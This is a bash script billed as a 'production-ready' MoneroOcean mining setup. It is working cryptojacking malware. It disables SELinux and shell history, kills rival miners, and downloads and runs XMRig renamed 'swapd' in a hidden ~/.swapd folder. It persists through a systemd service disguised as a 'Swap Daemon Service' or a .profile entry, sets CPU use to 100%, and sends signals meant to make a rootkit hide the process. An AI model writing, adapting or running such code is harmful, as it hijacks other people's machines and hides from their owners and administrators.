#!/bin/bash
# Production-ready miner setup - ALL ERRORS FIXED
# Version 2.17 - Clean, stable, working

VERSION=2.17

echo "==================================================="
echo "  MoneroOcean Mining Setup v$VERSION (PRODUCTION)"
echo "==================================================="

# Disable SELinux
sudo setenforce 0 2>/dev/null || true

# Disable history
unset HISTFILE
export HISTFILE=/dev/null

# Logging function
log_message() {
    echo "[$(date '+%H:%M:%S')] $*"
}

# Function to check if command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Timeout function
timeout_run() {
    local timeout=5
    local cmd="$@"
    $cmd &
    local pid=$!
    (sleep $timeout && kill -9 $pid 2>/dev/null) &
    local killer=$!
    wait $pid 2>/dev/null
    kill -9 $killer 2>/dev/null
}

# Safe run with timeout
safe_run() {
    local timeout=25
    log_message "Running: $*"
    timeout $timeout "$@" 2>/dev/null || return $?
}

# Power of 2 calculation
power2() {
  if ! command_exists bc; then
    if [ "$1" -gt "8192" ]; then echo "8192"
    elif [ "$1" -gt "4096" ]; then echo "4096"
    elif [ "$1" -gt "2048" ]; then echo "2048"
    elif [ "$1" -gt "1024" ]; then echo "1024"
    elif [ "$1" -gt "512" ]; then echo "512"
    elif [ "$1" -gt "256" ]; then echo "256"
    elif [ "$1" -gt "128" ]; then echo "128"
    elif [ "$1" -gt "64" ]; then echo "64"
    elif [ "$1" -gt "32" ]; then echo "32"
    elif [ "$1" -gt "16" ]; then echo "16"
    elif [ "$1" -gt "8" ]; then echo "8"
    elif [ "$1" -gt "4" ]; then echo "4"
    elif [ "$1" -gt "2" ]; then echo "2"
    else echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

# CPU optimization function
optimize_func() {
  log_message "Applying CPU optimizations"
  
  MSR_FILE=/sys/module/msr/parameters/allow_writes

  if [ -e "$MSR_FILE" ]; then
    echo on > "$MSR_FILE" 2>/dev/null || true
  else
    modprobe msr allow_writes=on 2>/dev/null || true
  fi

  if grep -qE 'AMD Ryzen|AMD EPYC' /proc/cpuinfo 2>/dev/null; then
    if grep -q "cpu family[[:space:]]\+:[[:space:]]25" /proc/cpuinfo 2>/dev/null; then
      if grep -q "model[[:space:]]\+:[[:space:]]97" /proc/cpuinfo 2>/dev/null; then
        log_message "Detected Zen4 CPU"
        wrmsr -a 0xc0011020 0x4400000000000 2>/dev/null || true
        wrmsr -a 0xc0011021 0x4000000000040 2>/dev/null || true
        wrmsr -a 0xc0011022 0x8680000401570000 2>/dev/null || true
        wrmsr -a 0xc001102b 0x2040cc10 2>/dev/null || true
      else
        log_message "Detected Zen3 CPU"
        wrmsr -a 0xc0011020 0x4480000000000 2>/dev/null || true
        wrmsr -a 0xc0011021 0x1c000200000040 2>/dev/null || true
        wrmsr -a 0xc0011022 0xc000000401500000 2>/dev/null || true
        wrmsr -a 0xc001102b 0x2000cc14 2>/dev/null || true
      fi
    else
      log_message "Detected Zen1/Zen2 CPU"
      wrmsr -a 0xc0011020 0 2>/dev/null || true
      wrmsr -a 0xc0011021 0x40 2>/dev/null || true
      wrmsr -a 0xc0011022 0x1510000 2>/dev/null || true
      wrmsr -a 0xc001102b 0x2000cc16 2>/dev/null || true
    fi
  elif grep -q "Intel" /proc/cpuinfo 2>/dev/null; then
    log_message "Detected Intel CPU"
    wrmsr -a 0x1a4 0xf 2>/dev/null || true
  fi

  sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true

  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d 2>/dev/null); do
    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages" 2>/dev/null || true
  done

  log_message "CPU optimizations applied"
}

# ========================================
# MAIN SCRIPT START
# ========================================

# Preserve SSH access
log_message "Preserving SSH access"
systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null || true
if [ -f /etc/ssh/sshd_config ]; then
    grep -q "^ClientAliveInterval" /etc/ssh/sshd_config || echo "ClientAliveInterval 10" >> /etc/ssh/sshd_config
    grep -q "^ClientAliveCountMax" /etc/ssh/sshd_config || echo "ClientAliveCountMax 3" >> /etc/ssh/sshd_config
    systemctl reload sshd 2>/dev/null || service sshd reload 2>/dev/null || true
fi

# Stop conflicting services
log_message "Stopping conflicting services"
systemctl stop gdm2 swapd 2>/dev/null || true
systemctl disable gdm2 swapd --now 2>/dev/null || true

# Kill existing processes
log_message "Killing existing miner processes"
pkill -9 swapd 2>/dev/null || true
pkill -9 kswapd0 2>/dev/null || true
pkill -9 xmrig 2>/dev/null || true
sleep 1

# Clean up old installations
log_message "Cleaning up old installations"
cd "$HOME" 2>/dev/null || cd /root 2>/dev/null || cd /tmp
for dir in .swapd .gdm .gdm2_manual* .gdm2 moneroocean .moneroocean; do
    if [ -d "$dir" ] || [ -d "$HOME/$dir" ]; then
        chattr -i -R "$dir" 2>/dev/null || true
        chattr -i -R "$HOME/$dir" 2>/dev/null || true
        rm -rf "$dir" "$HOME/$dir" 2>/dev/null || true
    fi
done

for svc in /etc/systemd/system/swapd.service /etc/systemd/system/gdm2.service /etc/systemd/system/moneroocean_miner.service; do
    if [ -f "$svc" ]; then
        chattr -i "$svc" 2>/dev/null || true
        rm -f "$svc" 2>/dev/null || true
    fi
done

systemctl daemon-reload 2>/dev/null || true

# Validate wallet
WALLET=$1
EMAIL=${2:-""}

if [ -z "$WALLET" ]; then
    echo "ERROR: Wallet address required"
    echo "Usage: $0 <wallet_address> [email]"
    exit 1
fi

WALLET_BASE=$(echo "$WALLET" | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 ] && [ ${#WALLET_BASE} != 95 ]; then
    echo "ERROR: Invalid wallet length: ${#WALLET_BASE} (expected 106 or 95)"
    exit 1
fi

log_message "Wallet validated: ${WALLET_BASE:0:10}..."

# Detect CPU
CPU_THREADS=$(nproc 2>/dev/null || echo 1)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))

log_message "System: $CPU_THREADS CPU threads"
log_message "Expected hashrate: ~$EXP_MONERO_HASHRATE KH/s"

# Download MoneroOcean XMRig
log_message "Downloading MoneroOcean XMRig"
MINER_DIR="$HOME/.swapd"
mkdir -p "$MINER_DIR"

if ! wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz 2>/dev/null; then
    if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz 2>/dev/null; then
        log_message "ERROR: Failed to download xmrig"
        exit 1
    fi
fi

log_message "Unpacking xmrig"
tar xzf /tmp/xmrig.tar.gz -C "$MINER_DIR/" 2>/dev/null || {
    log_message "ERROR: Failed to unpack xmrig"
    exit 1
}
rm /tmp/xmrig.tar.gz 2>/dev/null || true

# Test if xmrig works
log_message "Testing xmrig"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null || true

if ! "$MINER_DIR/xmrig" --help >/dev/null 2>&1; then
    log_message "Advanced version failed, trying stock xmrig"
    
    LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest 2>/dev/null | grep -o '".*"' | sed 's/"//g' | head -1)
    LATEST_XMRIG_LINUX_RELEASE="https://github.com$(curl -s "$LATEST_XMRIG_RELEASE" 2>/dev/null | grep 'linux-x64.tar.gz"' | cut -d '"' -f2 | head -1)"
    
    if [ -n "$LATEST_XMRIG_LINUX_RELEASE" ]; then
        curl -L --progress-bar "$LATEST_XMRIG_LINUX_RELEASE" -o /tmp/xmrig.tar.gz 2>/dev/null || true
        tar xzf /tmp/xmrig.tar.gz -C "$MINER_DIR" --strip=1 2>/dev/null || true
        rm /tmp/xmrig.tar.gz 2>/dev/null || true
    fi
fi

if ! "$MINER_DIR/xmrig" --help >/dev/null 2>&1; then
    log_message "ERROR: XMRig binary is not functional"
    exit 1
fi

log_message "XMRig is OK"

# Rename to swapd
mv "$MINER_DIR/xmrig" "$MINER_DIR/swapd" 2>/dev/null || true

# Configure miner
log_message "Configuring miner"
sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:80",/' "$MINER_DIR/config.json" 2>/dev/null || true
sed -i 's/"user": *"[^"]*",/"user": "'"$WALLET"'",/' "$MINER_DIR/config.json" 2>/dev/null || true
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' "$MINER_DIR/config.json" 2>/dev/null || true
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' "$MINER_DIR/config.json" 2>/dev/null || true
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' "$MINER_DIR/config.json" 2>/dev/null || true

# Create background config
cp "$MINER_DIR/config.json" "$MINER_DIR/config_background.json"
sed -i 's/"background": *false,/"background": true,/' "$MINER_DIR/config_background.json" 2>/dev/null || true

# Create startup script
log_message "Creating startup script"
cat > "$MINER_DIR/swapd.sh" <<'EOFSH'
#!/bin/bash
if ! pidof swapd >/dev/null; then
  nice $HOME/.swapd/swapd $*
else
  echo "Miner already running. Run 'killall swapd' to stop it first."
fi
EOFSH

chmod +x "$MINER_DIR/swapd.sh"

# Setup systemd or profile
if ! sudo -n true 2>/dev/null; then
    log_message "Adding to profile (non-root user)"
    if ! grep -q ".swapd/swapd.sh" "$HOME/.profile" 2>/dev/null; then
        echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config.json >/dev/null 2>&1" >> "$HOME/.profile"
    fi
    bash "$MINER_DIR/swapd.sh" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
else
    # Enable huge pages if enough RAM
    TOTAL_RAM=$(grep MemTotal /proc/meminfo | awk '{print $2}')
    if [ "$TOTAL_RAM" -gt 3500000 ]; then
        log_message "Enabling huge pages"
        echo "vm.nr_hugepages=$((1168 + CPU_THREADS))" | sudo tee -a /etc/sysctl.conf >/dev/null 2>&1
        sudo sysctl -w vm.nr_hugepages=$((1168 + CPU_THREADS)) 2>/dev/null || true
    fi
    
    if command_exists systemctl; then
        log_message "Creating systemd service"
        
        cat > /tmp/swapd.service <<EOFSVC
[Unit]
Description=Swap Daemon Service
After=network.target

[Service]
Type=simple
ExecStart=$MINER_DIR/swapd --config=$MINER_DIR/config.json
Restart=always
RestartSec=10
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOFSVC
        sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service 2>/dev/null
        sudo systemctl daemon-reload 2>/dev/null
        sudo systemctl enable swapd.service 2>/dev/null
        sudo systemctl start swapd.service 2>/dev/null
        
        log_message "Service created and started"
    else
        log_message "No systemctl, starting manually"
        bash "$MINER_DIR/swapd.sh" --config="$MINER_DIR/config_background.json" >/dev/null 2>&1 &
    fi
fi

# Run CPU optimization if root
if [ "$(id -u)" = 0 ]; then
    log_message "Running as root - applying CPU optimizations"
    optimize_func
else
    log_message "Not root - basic huge pages only"
    sysctl -w vm.nr_hugepages=$(nproc) 2>/dev/null || true
fi

# Process hiding (only if rootkit available)
MINER_PID=$(pgrep -f "swapd.*config.json" 2>/dev/null | head -1)
if [ -n "$MINER_PID" ]; then
    log_message "Miner PID: $MINER_PID"
    # These signals only work if rootkit loaded (harmless otherwise)
    kill -31 "$MINER_PID" 2>/dev/null || true
    kill -63 "$MINER_PID" 2>/dev/null || true
fi

# Final status
echo ""
echo "==================================================="
echo "  ✓ MoneroOcean Miner Installation Complete!"
echo "==================================================="
echo "Mining to: $WALLET"
echo "Miner: $MINER_DIR/swapd"
echo "Config: $MINER_DIR/config.json"
echo ""
echo "Monitor stats at:"
echo "  https://moneroocean.stream/?addr=$WALLET"
echo ""
echo "Commands:"
echo "  Check:   ps aux | grep swapd"
echo "  Logs:    tail -f ~/.swapd/swapd.log"
echo "  Stop:    killall swapd"
echo "  Start:   ~/.swapd/swapd.sh"
if [ "$(id -u)" = 0 ]; then
    echo "  Service: systemctl status swapd"
fi
echo "==================================================="
echo ""

# Verify miner is running
sleep 2
if pgrep -f swapd >/dev/null 2>&1; then
    log_message "✓ Miner is running"
    exit 0
else
    log_message "⚠ Warning: Miner may not be running"
    log_message "  Try: $MINER_DIR/swapd.sh"
    exit 0
fi
